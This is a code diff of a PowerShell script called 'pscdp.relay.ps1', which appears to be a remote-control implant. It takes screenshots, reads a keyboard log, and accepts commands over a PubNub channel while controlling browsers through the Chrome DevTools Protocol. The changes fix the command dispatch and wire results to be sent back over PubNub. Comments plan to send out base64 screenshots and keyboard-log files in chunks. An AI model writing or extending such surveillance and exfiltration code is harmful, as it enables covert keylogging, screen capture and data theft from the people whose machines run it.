@@ -163,7 +163,7 @@ function Take-Screenshot() {
 }
 
 function Get-FrontendUrls() {
-    return $script:clientws.targets
+    return $script:clientws.GetTargets()
 }
 
 function Get-KeyboardLog() {
@@ -324,7 +324,6 @@ $script:get_targets_action = {
 
 }
 
-# TODO implement incmming commands
 function Process-PubNubEvent {
 
     param([string]$Message)
@@ -345,7 +344,7 @@ function Process-PubNubEvent {
     $cmd = $null
 
     try {
-        if ( $payload.message.builtincmd -eq "GetFrontEndrls" ) {
+        if ( $payload.message.builtincmd -eq "GetFrontEndUrls" ) {
             $isbuiltincmd = $true
             $cmd = $payload.message
         }
@@ -373,27 +372,10 @@ function Process-PubNubEvent {
 
     $resultout['result'] = $result
 
-    Log-Msg $payload
+    $script:pubnubws.SendPBMessage($resultout)
 
-    # GetScreenshot --> send back image as base64 string
-
-    # GetFrontendUrls --> send back 
-    #  $script:clientws.targets
-
-    <#
-    $cmd = @{
-        builtincmd="GetFrontendUrls"
-        source="pscdp.relay.ps1"
-        destination="BROADCAST"
-        ts=$(Get-Timestamp)
-        cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
-    }
-    #>
-    $result = Get-FrontendUrls
-
-    # --> write response back to pubnub 
-    # $cdpobj.SendPBMessage("test 41234 $(Get-Timestamp)") 
-    # $script:pubnubws.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true } } )
+    # GetScreenshot  --> send back image as base64 string --> requires chunking
+    # GetKeyboardLog --> send back owdkeyboardlog.txt file --> might also require chunking
 
     # HTTP request
     # issue Invoke-WebRequest to client frontend url with path
@@ -933,7 +915,6 @@ class PSCDP {
 
     }
 
-
     [void] SendPBMessage([hashtable]$cmd) {
 
         if ( [string]::IsNullOrEmpty($this.executionContextId) ) {
@@ -1037,7 +1018,7 @@ while ( $true ) {
 
     Log-Msg "...sleeping"
 
-    Start-Sleep -Milliseconds 200
+    Start-Sleep -Milliseconds $d
     $i++
 }
 
